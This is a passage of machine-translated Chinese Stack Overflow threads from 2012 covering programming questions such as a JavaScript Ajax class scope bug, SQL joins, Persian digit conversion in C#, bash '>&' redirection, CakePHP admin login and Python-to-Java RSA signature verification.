    float fixTransY = getFixTrans(transY, viewHeight, getImageHeight());
    if (fixTransX != 0 || fixTransY != 0) {
        matrix.postTranslate(fixTransX, fixTransY);
    }
    matrix.getValues(m);
    if (getImageWidth() < viewWidth) {
        m[Matrix.MTRANS_X] = (viewWidth - getImageWidth()) / 2;
    }
    if (getImageHeight() < viewHeight) {
        m[Matrix.MTRANS_Y] = (viewHeight - getImageHeight()) / 2;
    }
    matrix.setValues(m);
}

private float getFixTrans(float trans, float viewSize, float contentSize) {
    float minTrans, maxTrans;
    if (contentSize <= viewSize) {
        minTrans = 0;
        maxTrans = viewSize - contentSize;
    } else {
        minTrans = viewSize - contentSize;
        maxTrans = 0;
    }
    if (trans < minTrans)
        return -trans + minTrans;
    if (trans > maxTrans)
        return -trans + maxTrans;
    return 0;
} 
```

/** 获取图片的宽度（bitmapWidth *Zoom）* /

```
float getImageWidth(){
    float []m = new float[9];
    matrix.getValues(m);
    return m[Matrix.MSCALE_X]*bitmap.getWidth();
} 
```

/** 获取图片的高度（bitmapHeight *Zoom）* /

```
float getImageHeight(){
    float []m = new float[9];
    matrix.getValues(m);
    return m[Matrix.MSCALE_Y]*bitmap.getHeight();
} 
```

# javascript - 基本 Ajax 库中的错误

> ID：10069819
> 
> 赞同：0
> 
> 时间：2012-04-09T06:37:38.447
> 
> 标签：javascript, ajax, scope

一直在尝试根据 Matthew Eernise 的“构建您自己的 AJAX Web 应用程序”一书中的教程使用 JavaScript 创建一个基本的 Ajax 库（请参阅[此处](http://www.sitepoint.com/books/ajax1/)），因为我想更深入地了解 AJAX XML-RPC 和 REST。根据这本书，我创建了一个 JavaScript 构造函数来获取 AJAX 或 XMLHttpRequest，但不知何故，我似乎遇到了超出范围的问题，并且 Ajax 类未在以下脚本中定义：

```
function Ajax() {
    // properties 
    this.req = null;
    this.url = null;
    this.method = 'GET';
    this.asynch = true;
    this.status = null;
    this.statusText = '';
    this.postData = null;
    this.readyState = null;
    this.responseText = null;
    this.responseXML = null;
    this.handleResp = null;
    this.responseFormat = 'text',
    // 'text', 'html', 'xml' or 'object'
    this.mimeType = null;

} // End Constructor

//Create XMLHttpRequest method with  XMLHttpRequest object
this.init = function() {
    if (!this.req) {
        try {
            //Try to create objects for Firefox, Safari, IE7, etc.
            this.req = newXMLHttpRequest();
        }

        catch(e) {
            try {
                //Try to create object for later versions of IE.
                this.req = new ActiveXObject('MSXML2.XMLHTTP');
            }

            catch(e) {
                try {
                    //Try to create for early versions of IE.
                    this.req = new ActiveXObject('Microsoft.XMLHTTP');
                }

            catch(e) {
                //Could not create XMLHttpRequest object.
                return false;
            }
        }
    }
}
return this.req;
};

//Sending a Request method
this.doReq = function() {
    if (!this.init()) {
        alert('Could not create XMLHttpRequest object.');
        return;
    }
    //Setting up a request
    //open methods with method, url and asycn yes or no
    this.req.open(this.method, this.url, this.asynch);
    //Make sure mimetype is OK
    if (this.mimeType) {
    try {
        req.overrideMimeType(this.mimeType);
    }
    catch(e) {
        //couldn't override MIME type ... IE6 or Opera?
        }
}

var self = this; // fix loss-of-scope in inner function
this.req.onreadystatechange = function() {
    var resp = null;
    if (self.req.readyState == 4) {
        //do stuff to handle response
            switch (self.reponseFormat) {
            case 'text':
                resp = self.req.responseText;
                break;
            case 'xml':
                resp = self.req.responseXML;
                break;
            case 'object':
                resp = req;
                break;
            }
            if (self.req.status >= 200 && self.req.status <= 299) {
                self.handleResp(resp);
            }
            else {
                self.handleErr(resp);
            }
        }

};
this.req.send(this.postData);
};

this.handleErr = function() {
    var errorWin;
    try {
        errorWin = window.open('', 'errorWin');
        errorWin.document.body.innerHTML = this.responseText;
    }
    catch(e) {
        alert('An error occured, but this error message cannot be '
        + 'displayed. This is probably because of your browser\'s '
        + 'pop-up blocker. \n'
        + 'Please  allow pop-ups from this website if you want to '
        + 'see the full error messages. \n'
        + '\n'
        + 'Status Code: ' + this.req.status + '\n'
        + 'Status description: ' + this.req.statusText);
    }
};

this.abort = function() {
    if (this.req) {
        this.req.onreadystatechange = function() {};
        this.req.abort();
        this.req = null;
    }
};

this.doGet = function (url, hand, format) {
    this.url = url;
    this.handleResp = hand;
    this.responseFormat = format || 'text' ;
    this.doReq();
}; 
```

我在加载此脚本的页面上遇到的错误

```
var hand = function (str) {
    alert(str);
}
var Ajax = new Ajax(); // new instance as can ben done with PHP5 constructor classes
ajax.doGet ('/fakeserverpage.php', hand); 
```

并启动一个新的 Ajax 实例得到错误`ajax is not defined`，即使我确实添加`var self = this; // fix loss-of-scope in inner function` 了修复范围问题。我错过了什么？

**更新 1**

感谢这里的提示给新实例一个不同的名称，这样它们就不会发生冲突：

```
var hand = function (str) {
    alert(str);
}
var ajax = new Ajax(); // new instance as can ben done with PHP5 constructor classes
ajax.doGet ('/fakeserverpage.php', hand); 
```

现在我走得更远了。现在我收到一个新错误：`Uncaught TypeError: Object #<Ajax> has no method 'doGet'`

**更新 2**

我尝试使用`Ajax.prototype.init`而不是 `this.init`这里的合作开发人员推荐的，但我仍然有同样的错误..

**更新 3** 感谢@Soufiana Hassou，我通过添加`Ajax.prototype`所有方法改进了代码。不知道所有人都必须使用构造函数，但确实如此。代码在这里[http://pastebin.com/g86k0z8d](http://pastebin.com/g86k0z8d)。我现在得到这个弹出窗口，说`Could not create XMLHttpRequest object.`这个错误消息是内置在方法中的，所以它可以工作，但它不能以某种方式创建对象。这意味着我的 XMLHttpRequest 请求中一定存在错误，因为我涵盖了所有情况，并使用本地 MacPorts MAMP 上的代码在 Firefox 11 for Mac 中对此进行了测试。要么那个，要么还有其他我不知道的东西..

**更新 4**

修正了一个错字。然后我得到一个 404 加载假服务器页面。更正了路径`ajax.doGet ('/ajax/fakeserverpage.php', hand);`，所以现在可以了。只有我需要获取 PHP 来生成代码，所以我得到了一个 OK。标头响应正常，但我还没有看到 AJAX 警报。然后我检查了控制台，发现了这个错误：

```
self.req is undefined
http://localhost/ajax/ajax.js
Line 78 
```

查看最新代码： http: [//pastebin.com/g86k0z8d](http://pastebin.com/g86k0z8d)。`Ajax.prototype`我在我认为仍然需要它们的地方添加了更多内容。现在我得到：

```
this.req is null
http://localhost/ajax/ajax.js
Line 100 
```

**更新 5**

使用 var 进行了更多更改，删除了最初用于超出范围问题的一些 self `self = this`。代码仍然是相同的 pastebin，但我已经更新了它。我现在有：

```
Ajax.prototype.handleResp is not a function
http://localhost/ajax/ajax.js
Line 92 
```

**更新 6**

我清理了我在`req.onreadystatechange = function()`函数中犯的一些错误，现在我运行了。我为 localhost 关闭了 Firefox 弹出窗口阻止程序，并在重新加载时打开了另一个选项卡并显示了文本`undefined`。所以差不多了。没有错误，只是没有弹出OK。`undefined`Chrome在正文中显示了一个弹出窗口。此处更新代码：http: [//pastebin.com/g86k0z8d](http://pastebin.com/g86k0z8d)照常

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:40:07.800

您为实例和类本身使用相同的名称。此外，您声明`Ajax`和使用`ajax`Javascript 是区分大小写的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T07:03:14.133

首先，你有`var Ajax = new Ajax();`你应该有`var ajax = new Ajax();`。

其次，`this`在构造函数之外使用并不是指 Ajax 对象。尝试改用它的原型：

```
function Ajax() {
    // Set properties here
}
Ajax.prototype.init = function() {
    // ...
} 
```

有关更多信息，请参阅[这篇关于 Javascript 类](http://www.phpied.com/3-ways-to-define-a-javascript-class/)的文章。

# android - Android 默认地图应用问题

> ID：10069822
> 
> 赞同：0
> 
> 时间：2012-04-09T06:37:51.050
> 
> 标签：android, google-maps, google-maps-api-3

我的手机中的默认谷歌地图应用程序有一个问题。

我使用以下代码在按钮单击时调用默认地图应用程序：

```
Uri uri = Uri.parse("geo:"+ Global.curLatitude+","+Global.curLongitude);
Intent in = new Intent(Intent.ACTION_VIEW, uri);
startActivity(in); 
```

问题是，当地图打开时，它看起来具有最大缩放级别，因此我能够以最大缩放级别查看位置。我可以使用此代码设置缩放级别吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:49:11.520

```
Uri uri = Uri.parse("geo:"+ Global.curLatitude+","+Global.curLongitude+"?z=zoom");
Intent in = new Intent(Intent.ACTION_VIEW, uri);
startActivity(in); 
```

使用上面的代码来满足您的要求。并用您想要的缩放值替换缩放。

# php - 如何在 X 上左连接 A 到 B，然后在 Y 上连接 B 到 C

> ID：10069824
> 
> 赞同：2
> 
> 时间：2012-04-09T06:38:13.623
> 
> 标签：php, mysql, sql

我是世界上最新加入 LEFT JOIN 乐趣的人。以下工作很好：

```
$STH = $DBH->prepare("
SELECT cc.cat_subject, cc.cat_major, cc.cat_minor, cc.cat_name, c.cnum, c.unmod
  FROM comment_category cc 
LEFT JOIN comment c
  ON cc.cat_subject = c.cat_subject AND cc.cat_major = c.cat_major AND cc.cat_minor = c.cat_minor
ORDER BY cc.cat_subject, cc.cat_major, cc.cat_minor"); 
```

不过，我现在想做的是引用另一个表`favourite (f)`，该表只有一个公共字段`cnum`with `comment (c)`，而没有一个 with `comment_category (cc)`。

我尝试了以下方法：

```
$STH = $DBH->prepare("
SELECT cc.cat_subject, cc.cat_major, cc.cat_minor, cc.cat_name, c.cnum, c.unmod, f.favourite
FROM comment_category cc 
LEFT JOIN comment c 
  ON cc.cat_subject=c.cat_subject AND cc.cat_major=c.cat_major AND cc.cat_minor=c.cat_minor
LEFT JOIN favourite f
  ON c.cnum=f.cnum
ORDER BY cc.cat_subject, cc.cat_major, cc.cat_minor"); 
```

它不起作用。我猜（从我读过的内容来看）这是因为我实际上是在请求另一个 join to`comment_category (cc)`而不是 to `comment (c)`。

简而言之：我如何从 A 中选择，LEFT JOIN 到 B，然后使用 B 中的字段来访问 C 中的值？

更新（由于下注者的不满）：

这些表是：

```
comment_category
----------------
subject   (int)
cat_major (int)
cat_minor (int)
name      (varchar)

comment
-------
cnum      (int)
subject   (int)
cat_major (int)
cat_minor (int)
unmod     (varchar)

favourite
---------
cnum      (int) 
```

...我会停在这里 - 它崩溃是因为表中没有最喜欢的字段`favourite`。

我的错。对不起，所有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T14:58:20.450

很高兴你自己解决了这个问题。既然您说您是 JOIN 新手，我确实想补充一点，每当您将 2 个以上的表连接在一起时，考虑使用 INNER JOIN 是个好主意。不同之处在于，无论您在评论中是否有匹配项，LEFT JOIN 都将返回 LEFT 上的行（在本例中为 comment_category）。INNER JOIN 不会从 comment_category 返回行，除非它在评论中也有匹配项。

在这种情况下这很重要的原因是，为了让您的收藏夹上的 JOIN 返回除 NULL 之外的任何内容，您的查询首先需要匹配评论中来自 comment_category 的行。如果您在 comment_category 和 comment 上使用 INNER JOIN，则故障排除将不那么含糊。此外，使用 INNER JOIN 将消除结果中的 NULL 值（即 JOIN 不匹配导致的 NULL）。

LEFT 与 INNER JOIN 的使用也取决于您的业务需求。例如，如果comment_category 中的所有行都**必须**在comment 中匹配，那么您应该使用INNER JOIN。但是，如果您查询的评论不一定有收藏夹（但如果有的话，您希望它们返回），那么您应该使用 LEFT JOIN。希望这可以帮助。

# android - 安卓和网站同步

> ID：10069825
> 
> 赞同：0
> 
> 时间：2012-04-09T06:38:16.350
> 
> 标签：android

我有一个问题。我们有一个网站，人们可以登录并使其成为`s own list`新闻。现在我们尝试开发一个Android应用程序，人们可以在其中登录并在手机上做同样的事情。我无法理解实施此类事情的最佳做法。它必须是相同的帐户，保留的数据与网站上在线存储的数据相同。

谁能告诉我如何同步网页和安卓？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:41:32.500

您可以使用后端脚本从 android 网站的数据库中获取相同的数据。您需要调用脚本（使用任何语言，如 php）从数​​据库中获取数据。并在 android 的 listview 中显示或将其与输入的用户 ID 密码进行比较。

# c# - 在呈现控件时，我可以将英文数字更改为阿拉伯/波斯表示吗？

> ID：10069826
> 
> 赞同：3
> 
> 时间：2012-04-09T06:38:39.627
> 
> 标签：c#, wpf

英文数字（12345678）和其他一些符号（如十进制）在波斯语（۱2۳۴۵۶۷۸۹۰）或（۳/۱而不是3.1）中是不同的。我希望语言在我的控件中是可选的。

例如，当我将 TextBlock 的 TextProperty 设置为“2345”时，我希望它同时显示“2345”和“2345”，可选。

渲染控件时可以更改特定字体吗？我的意思是我覆盖渲染或其他一些方法，例如添加：

```
if (char=='5')
{
    char='۵';
} 
```

还是有其他方法？谢谢;

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-12-11T11:43:52.503

我使用我编写的一个简单代码：

```
private string toPersianNumber(string input)
{
   string[] persian = new string[10] { "۰", "۱", "۲", "۳", "۴", "۵", "۶", "۷", "۸", "۹" };

   for (int j=0; j<persian.Length; j++)
       input = input.Replace(j.ToString(), persian[j]);

     return input;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-10-24T07:50:54.487

这里我的代码通过扩展方法将英文数字转换为波斯数字：

```
 private static readonly string[] pn = { "۰", "۱", "۲", "۳", "۴", "۵", "۶", "۷", "۸", "۹" };
    private static readonly string[] en = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" };

public static string ToPersianNumber(this string strNum)
    {
        string chash = strNum;
        for (int i = 0; i < 10; i++)
            chash = chash.Replace(en[i], pn[i]);
        return chash;
    }
    public static string ToPersianNumber(this int intNum)
    {
        string chash = intNum.ToString();
        for (int i = 0; i < 10; i++)
            chash = chash.Replace(en[i], pn[i]);
        return chash;
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-07-13T15:12:19.433

您可以使用[CultureInfo](https://docs.microsoft.com/en-us/dotnet/api/system.globalization.cultureinfo)，例如：

```
public static string NumberConvertor(this object o, CultureInfo to)
{
    if (o == null) return "";

    var s = o.ToString();
    for (int i = 0; i <= 9; i++)
    {
        s = s.Replace(i.ToString(), to.NumberFormat.NativeDigits[i]);
    }

    return s;
}

// usage example
var myNumber = 0123456789.4;
var converted = myNumber.NumberConvertor(new CultureInfo("fa-IR")); // output: ۱۲۳۴۵۶۷۸۹.۴ 
```

# android - Android从警报框中获取点击值

> ID：10069829
> 
> 赞同：0
> 
> 时间：2012-04-09T06:38:51.130
> 
> 标签：android

我有一个带有频道列表的警报框。

我想获得点击频道的价值。

这可能吗？

到目前为止我有这个..

```
 public void ShowChannelDialog(){

      String[] channels = new String[_publicChannels.size()];
      channels = _publicChannels.toArray(channels);

      AlertDialog.Builder showChannel = new AlertDialog.Builder(this);
      showChannel.setTitle("Channel List ("+(_publicChannels.size()-1)+" channels)");

      showChannel.setItems(channels, new DialogInterface.OnClickListener() {

        public void onClick(DialogInterface dialog, int item) {
            _publicChannels.clear();
            if (item == (_publicChannels.size())) {
                System.out.println("NEW CHANNEL");
                CreateNewChannel();
                dialog.dismiss();
            }else{
                String channel = String.valueOf(item);
                System.out.println("Selected: " + channel);
            }
        }
    }); 
```

String.valueof(item) 只给我数组中的 int 值，我想要实际的文本值。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:49:38.650

代替`String.valueOf(item)`, 使用`channels[item]`. 您还需要制作频道`final`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:49:46.887

尝试关注

```
 if (item == (_publicChannels.size())) {
            System.out.println("NEW CHANNEL");
            CreateNewChannel();
            dialog.dismiss();
        }else{
            String channel = channels[item];
            System.out.println("Selected: " + channel);
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T07:29:46.577

退出时的示例 CONFIRMATION 对话框

```
 AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Are you sure you want to exit?")
                .setCancelable(false)
                .setPositiveButton("Yes",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,
                                    int id) {
                                finish();
                            }
                        })
                .setNegativeButton("No",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,
                                    int id) {
                                dialog.cancel();
                            }
                        });
        AlertDialog alert = builder.create();
        alert.show(); 
```

# bash - 外壳 >& 运算符？

> ID：10069831
> 
> 赞同：1
> 
> 时间：2012-04-09T06:38:59.973
> 
> 标签：bash

我有一个关于我认为是运算符或参数传递者的问题，但谷歌没有发现任何东西。包含在其中的脚本是

```
#!/bin/sh
ln mopac.in FOR005
mopac >& FOR006
mv FOR006 mopac.out 
```

当我调用“mopac mopac.in”时，程序运行良好，但根据我的需要，使用此脚本在另一个程序中调用 mopac，但似乎输入文件未能通过，因此 mopac 没有运行。我不明白“>&”应该做什么，所以我遇到了故障排除问题。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:47:56.553

`>& FILE`不推荐使用`bash`（从`csh`）简写`> FILE 2>&1`，即重定向标准输出和标准错误。（如果`/bin/sh`不是`bash`，就像在许多 Linux 发行版上一样，这将引发错误。）较旧的`bash`（3.0 之前）更喜欢这种形式，所以大多数新人`bash`仍然理解它，尽管可能最近`bash`终于删除了它，因为他们似乎终于要删除最近不推荐使用的构造了。

您的脚本根本没有通过`mopac.in`，但似乎假设`mopac`将从 读取其输入`FOR005`，因此用于`ln`使其在那里可用。也许您应该将脚本更改为`mopac.in`作为参数读取，就像您直接运行它一样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:49:26.190

此处说明：http: [//tldp.org/LDP/abs/html/io-redirection.html](http://tldp.org/LDP/abs/html/io-redirection.html)

```
>&j
  # Redirects, by default, file descriptor 1 (stdout) to j.
  # All stdout gets sent to file pointed to by j. 
```

# c# - 工作流服务错误

> ID：10069846
> 
> 赞同：2
> 
> 时间：2012-04-09T06:41:18.490
> 
> 标签：c#, workflow-foundation, workflow-foundation-4, workflowservice

我正在尝试从 asp .net 应用程序调用工作流服务，但出现以下错误。有什么想法或帮助吗？

System.ServiceModel.FaultException：无法执行操作，因为 WorkflowInstance '2dde84a5-da6e-4951-a404-d659fb23b5bd' 已终止。服务器堆栈跟踪：在 System.ServiceModel.Channels.ServiceChannel.HandleReply(ProxyOperationRuntime operation, ProxyRpc& rpc) 在 System.ServiceModel.Channels.ServiceChannel.Call(String action, Boolean oneway, ProxyOperationRuntime operation, Object[] ins, Object[] outs , TimeSpan timeout) at System.ServiceModel.Channels.ServiceChannelProxy.InvokeService(IMethodCallMessage methodCall, ProxyOperationRuntime operation) at System.ServiceModel.Channels.ServiceChannelProxy.Invoke(IMessage message) 在 [0] 处重新抛出异常：在 System.Runtime.Remoting.Proxies .RealProxy.HandleReturnMessage(IMessage reqMsg, IMessage retMsg) 在 System.Runtime.Remoting.Proxies.RealProxy。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T16:59:51.657

听起来工作流在发送回复之前中止了。查看我的博客文章寻求帮助。 [使用诊断日志对工作流服务进行故障排除](http://blogs.msdn.com/b/rjacobs/archive/2011/12/16/troubleshooting-workflow-services-with-diagnostic-logging.aspx)

# php - 启动浏览器时出现 Selenium 错误

> ID：10069847
> 
> 赞同：2
> 
> 时间：2012-04-09T06:41:26.090
> 
> 标签：php, selenium, phpunit, selenium-rc, selenium-webdriver

我面临着 Selenium 的两个问题。

1.- 在 windows 上启动浏览器时出错 --> Example::testMyTestCase

捕获屏幕截图时的问题：

```
Invalid response while accessing the Selenium Server at 
   'http://localhost:4444/selenium-server/driver/': 
    ERROR Server Exception: sessionId should not be null; 
has this session been started yet?

Invalid response while accessing the Selenium Server at 
   'http://localhost:4444/selenium-server/driver/': 
   Failed to start new browser session: Error while launching browser 
```

2.- 我在 Linux 上使用过 Selenium。使用 PHPunit 运行代码时，打开的浏览器窗口会自动关闭。执行后我需要查看日志详细信息。这需要什么设置吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-20T06:27:02.643

请尝试使用最新的 Selenium-Server.jar (selenium-server-standalone-2.23.1.jar) 执行此脚本

# php - 在提交来自时显示 AJAX 加载器

> ID：10069854
> 
> 赞同：0
> 
> 时间：2012-04-09T06:42:34.887
> 
> 标签：php, ajax

我想在用户尝试提交表单时显示一个 ajax 加载器图标，并阻止页面内容（淡入）。

我有这个代码，但它工作错误，它在提交表单之前显示加载器图标并在提交表单后隐藏它。

```
<script type="text/javascript">
function ajaxFunction() {
    var xmlHttp;
    try {
        // Firefox, Opera 8.0+, Safari
        xmlHttp = new XMLHttpRequest();
    }
    catch (e) {
        // Internet Explorer
        try {
            xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
        }
        catch (e) {
            try {
                xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
            }
            catch (e) {
                alert("Your browser does not support AJAX!");
                return false;
            }
        }
    }
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState == 4) {
            document.getElementById("content").innerHTML = xmlHttp.responseText;
        }
    }
    xmlHttp.open("GET", "?action=sms&pageaction=Send SMS", true);
    xmlHttp.send(null);
}​
</Script> 
```

我有 DIV ：

```
<!---progress-->

<div id="content" > 
  <br/>
  <br/>
  <br/>
  <h1>Loading ... Please wait </h1>
  <br/>
  <br/>
  <img src="image//loading.gif" />
    </div>

<!---progress--> 
```

按钮正在`submit`调用`ajaxFunction()`

```
<input type="submit" name="pageaction"  class="send_sms" value="Send SMS" onclick="ajaxFunction()" /> 
```

任何人都请帮助我更正我的代码以使其工作如下：

1.  在提交表单时显示透明背景以阻止页面。
2.  显示加载图标。
3.  隐藏透明背景并隐藏加载图标。

谢谢大家

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:55:14.707

设置你`content`的隐藏。你可以简单地做到这一点：

```
<div id="content" style="display:none;">
  ...
</div> 
```

在发送 AJAX 请求之前使其可见。

```
document.getElementById("content").style.display = "block";​​​​​​
xmlHttp.send(null); 
```

# c# - 在 WPF 中为 FolderBrowserDialog 应用 xaml 样式

> ID：10069855
> 
> 赞同：1
> 
> 时间：2012-04-09T06:43:05.490
> 
> 标签：c#, wpf, xaml, styles, folderbrowserdialog

我有一个样式 Xaml，用于设置 WPF 窗口的样式。但是我在窗口中使用的 FolderBrowseDialog 不会应用相同的样式。这在实际窗口和对话框弹出窗口之间产生了奇怪的 UI 差异。如何纠正这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:50:41.463

据我所知，不幸的是你不能。您要么必须创建自己的用户控件，要么使用 Internet 中已经定义的一些控件。

[Kevin Moore 的 Bag-o-Tricks](http://work.j832.com/2008/03/bag-o-tricks-march-edition.html)中有许多其他花哨的控件，其中一个很酷。

# java - 从 java 应用程序调用 acceleo 模板

> ID：10069858
> 
> 赞同：0
> 
> 时间：2012-04-09T06:43:24.943
> 
> 标签：java, acceleo

大家好，我对 acceleo 很陌生

在我的项目中，我有一个调用不同加速模板的 java 驱动程序类。一些模板具有没有任何 EObject 类型的参数。我正在为模板调用生成的 java 模块的 initialize() 和 doGenerate() 函数。面临的问题是：

1.  initialize() 期望第一个参数是 Ecore 对象，其余参数是 List。然而，正如我提到的，一些模板没有任何 EObject 参数。如何从 Java 应用程序调用此类模板？

2.  为了解决上述问题，我调整了我的驱动程序和模板以将虚拟 EObject 作为第一个参数。然后它成功调用模板，但不会生成任何输出。如果我从另一个驱动程序模板调用它们，模板会生成输出。但是我不想用 MTL 编写我的驱动程序，因为它需要对数据模型进行复杂的分析。

请建议我如何在我的案件中取得进展。

谢谢&问候
Dhanunjaya M.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:23:51.513

默认情况下，我们通过我们生成的 Java 类与“主”模板的模块和 Acceleo“外观”类一起公开的 API 总是假设有一个 EObject 作为要调用的模板的第一个参数。这样做是为了方便大多数用例的使用（我们希望这个用例占总数的 90%）。

对于其他用例，您将不得不使用这些外观背后的 API。也就是说，当您根本没有 EObject 时，您可以创建另一个不将 EObject 作为参数的“初始化”方法。然后，您还需要重写“generate(Monitor)”方法，使其不使用 AcceleoService.doGenerate... 或 AcceleoService 的任何其他方法：这就是我所说的“外观”类。

您需要调用一个模仿 AcceleoService.doGenerate 所做的方法，而不依赖于 EObject 来查找需要调用的模板。如果您手头没有 Acceleo 的 SDK 或源代码，您可以通过 github 查看代码：[AcceleoService#doGenerate](https://github.com/eclipse/acceleo/blob/6f1764e3b4750a023e6bac860bf4979830fa55f7/plugins/org.eclipse.acceleo.engine/src/org/eclipse/acceleo/engine/service/AcceleoService.java#L535)。

# cakephp - CakePHP 管理员登录

> ID：10069861
> 
> 赞同：1
> 
> 时间：2012-04-09T06:43:51.937
> 
> 标签：cakephp, cakephp-2.0

我有两种类型的用户，现在我不想使用 ACL。使用 Auth 组件，我想实现以下目标

login() -> 允许用户登录和访问网站的一般部分 admin_login -> 允许管理员访问网站的 admin_{actions} 部分。

当我进行管理员登录时 - >我想检查用户模块中的 group_id = 1 是否允许他们登录到网站的管理部分。

```
function admin_login(){
    $this->layout = 'admin_login';

    if($this->request->is('post')) {
        if($this->Auth->login()) {
            $this->redirect($this->Auth->redirect());
        } else {
            $this->Session->setFlash(__('Invalid username and password, try again'));
        }
    }
} 
```

用户登录时如何检查group_id = 1？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T02:46:49.390

我会做这样的事情：

```
function admin_login(){
    $this->layout = 'admin_login';

    if($this->request->is('post')) {
        if($this->Auth->login()) {
            // If here because user is logged in
            // Check to see if group_id is 1
            if($this->Auth->user('group_id') == 1){
                //$this->redirect($this->Auth->redirect());
                $this->redirect('/admin/dashboards'); //Example
            }else{
                // In case a user tries to login thru admin_login
                // You should log them in anyway and send them to where they belond
                $this->redirect('/users/account'); 
            }
        } else {
            $this->Session->setFlash(__('Invalid username and password, try again'));
        }
    }
} 
```

# php - 使用 PHP MYSQL 加入带有递归 my book_category 的 SQL the book_list

> ID：10069862
> 
> 赞同：1
> 
> 时间：2012-04-09T06:44:04.733
> 
> 标签：php, mysql, arrays, recursion

我有两个表名`book_list`和`book_category`. 架构如下：

**书单**

```
+---------+--------+-----------+  
| id_book | id_cat | book_name |     
+---------+--------+-----------+     
|   1     |    3   | Book Nam1 |
|   2     |    1   | Book Nam2 |
|   3     |    2   | Book Nam3 |
+---------+--------+-----------+ 
```

**book_category**

```
+--------+----------+-----------+-------+
| id_cat | cat_name | id_parent | level |
+--------+----------+-----------+-------+
|   1    |   name1  |     0     |   1   | 
|   2    |  name1.1 |     1     |   2   |
|   3    |name1.1.1 |     2     |   3   |
+--------+----------+-----------+-------+ 
```

代码尝试：

```
SELECT a.id_book, a.id_cat, a.book_name, b.cat_name, b.level 
FROM book_list a
INNER JOIN book_category b  ON  a.id_cat = b.id_cat 
```

我需要操纵结果数组以添加面包屑，其中每个都有指向自身的链接，例如：

```
table row:
<td>3(id_book)</td>
<td>Book Nam3 (book_name)</td>
<td>
  <a href="handle.php?id=<?=id_cat;?>">Name 1</a> » 
  <a href="handle.php?id=<?=id_cat;?>">Name 1.1</a> »
  <a href="handle.php?id=<?=id_cat;?>">Name 1.1.1</a>
</td> 
```

希望我表达了我的观点，并感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T07:08:17.657

尝试

```
SELECT a.id_book, a.id_cat, a.book_name , b.cat_name, b.level 
FROM book_list a
JOIN book_category b  ON  USING(id_cat) 
```

进而

```
<a href="handle.php?id=<?=$id_cat;?>"><?=$cat_name?></a> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T07:11:28.193

试试这个查询。

```
SELECT
  bl.id_book, bl.id_cat, bl.book_name, tc2.cat_name, tc2.level
FROM
  book_list bl
JOIN book_category tc
  ON tc.id_cat = bl.id_cat
JOIN book_category tc2
  ON LOCATE(tc2.cat_name, tc.cat_name) > 0
WHERE
  tc.id_cat = 3 
```

此查询基于`cat_name`子字符串的出现。

# java - 在 Python 和 Java/Scala 之间插入 RSA 签名时遇到问题

> ID：10069864
> 
> 赞同：5
> 
> 时间：2012-04-09T06:44:21.593
> 
> 标签：java, python, scala, rsa, digital-signature

我正在使用 python-crypto API 在 Python2 中编写一个客户端来对 XML 文件进行数字签名，并且我有一个用 Scala 编写的服务来验证签名。我的 Python 代码如下所示：

```
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA
from os import urandom
import logging

...
... 
```

要生成密钥（密钥大小为 2048）：

```
self.__key = RSA.generate(self.keySize,urandom)
self.__private_key = self.__key.exportKey()
self.__public_key = self.__key.publickey().exportKey()
with open(pubPath,'w') as fpub:
    logging.info("Writing Public Key to %s" % pubPath)
    fpub.write(self.__public_key)
with open(priPath,'w') as fpri:
    logging.info("Writing Private Key to %s" % priPath)
    fpri.write(self.__private_key) 
```

并在键中阅读：

```
self.__private_key = fpri.read()
self.__public_key = fpub.read()
self.__key = RSA.importKey(self.__private_key) 
```

并进行数字签名

```
logging.debug('Data to sign: "%s"' % data)
digest = SHA.new(data.strip()).digest()
return str(self.__key.sign(digest, None)[0]) 
```

然后在 Scala/Java 中，我使用以下内容：

```
package com.example.security
import com.example.action.ActionRequest
import java.io.BufferedInputStream
import java.security.spec.X509EncodedKeySpec
import java.security.KeyFactory
import java.security.PublicKey
import java.security.Signature
import org.apache.log4j.Logger

class SignatureSecurityManageer extends SecurityManagerTrait {

    def loadPublicKey() : PublicKey = {
        val stream : BufferedInputStream = new BufferedInputStream(this.getClass().getResourceAsStream("/com/example/security/key.der"))
        var key = new Array[Byte](stream.available())
        stream.read(key)
        KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(key))
    }

    def securityFilter(req : ActionRequest) : Boolean = {

        var parts = req.data.split("\n\n")

        var log : Logger = Logger.getLogger(this.getClass());
        log.trace("Data \"%s\"".format(parts(0)))
        log.trace("Sig \"%s\"".format(parts(1)))

         var sg = Signature.getInstance("SHA1withRSA");
         sg.initVerify(loadPublicKey())
         sg.update(parts(0).trim().getBytes())
